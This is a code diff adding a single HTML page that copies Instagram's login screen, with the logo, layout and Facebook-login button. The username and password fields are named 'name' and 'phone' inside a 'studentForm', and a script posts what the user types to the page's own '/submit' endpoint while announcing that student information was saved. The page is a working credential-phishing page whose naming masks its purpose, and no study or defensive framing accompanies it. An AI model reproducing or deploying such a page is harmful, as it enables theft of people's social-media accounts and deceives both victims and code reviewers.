@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <style>/* styles.css */
+    body {
+        font-family: Arial, sans-serif;
+        background-color: white;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+      
+      
+      .container {
+        background-color: white;
+        padding: 50px;
+        width: 250px;
+        border: 1px solid #dbdbdb;
+        text-align: center;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        margin: 5px;
+      }
+      
+    
+      .logo {
+        font-family: cursive;
+        font-style: italic;
+        font-size: 48px;
+        color: #262626;
+        margin-bottom: 20px;
+      }
+      
+      .login-form {
+        display: flex;
+        flex-direction: column;
+      }
+      
+      .input-field {
+        padding: 10px;
+        margin: 5px 0;
+        font-size: 14px;
+        border: 1px solid #dbdbdb;
+        border-radius: 5px;
+        background-color: #fafafa;
+      }
+      
+      .input-field:focus {
+        outline: none;
+        border-color: #a3a3a3;
+      }
+      
+      .login-button {
+        background-color: #0095f6;
+        color: white;
+        padding: 10px;
+        margin: 10px 0;
+        border: none;
+        border-radius: 5px;
+        font-weight: bold;
+        cursor: pointer;
+      }
+      
+      .login-button:hover {
+        background-color: #0078c1;
+      }
+      
+      .divider {
+        margin: 15px 0;
+        position: relative;
+        color: #8e8e8e;
+        font-size: 14px;
+      }
+      
+      .divider:before,
+      .divider:after {
+        content: "";
+        display: block;
+        height: 1px;
+        background-color: #dbdbdb;
+        width: 40%;
+        position: absolute;
+        top: 50%;
+      }
+      
+      .divider:before {
+        left: 0;
+      }
+      
+      .divider:after {
+        right: 0;
+      }
+      
+      .facebook-button {
+        background-color: transparent;
+        color: #385185;
+        font-weight: bold;
+        border: none;
+        cursor: pointer;
+        margin: 10px 0;
+      }
+      
+      .facebook-button:hover {
+        text-decoration: underline;
+      }
+      
+      .forgot-password {
+        color: #385185;
+        text-decoration: none;
+        font-size: 12px;
+      }
+      
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+      
+      .signup {
+        margin-top: 20px;
+        font-size: 14px;
+      }
+      
+      .signup a {
+        color: #0095f6;
+        text-decoration: none;
+        font-weight: bold;
+      }
+      
+      .signup a:hover {
+        text-decoration: underline;
+      }
+      </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo"><img src="Instagram Logo.png" alt="Instagram"></div>
+
+    <form id="studentForm" class="login-form">
+      
+      <input id="name" type="text" placeholder="Phone number, username, or email" class="input-field">
+      <input id="phone" type="text" placeholder="Password" class="input-field">
+
+      <button type="submit" class="login-button">Log in</button>
+      
+      <div class="divider">OR</div>
+      <button type="button" class="facebook-button">Log in with Facebook</button>
+
+      <a href="#" class="forgot-password">Forgot password?</a>
+      <div class="signup">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+
+    </form>
+  </div>
+  <script>
+    document.getElementById('studentForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value;
+
+    const response = await fetch('/submit', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',
+  },
+  body: new URLSearchParams({ name, phone }),
+});
+
+
+    if (response.ok) {
+      alert('Student information saved!');
+    } else {
+      alert('Error saving information.');
+    }
+  });
+  </script>
+</body>
+</html>
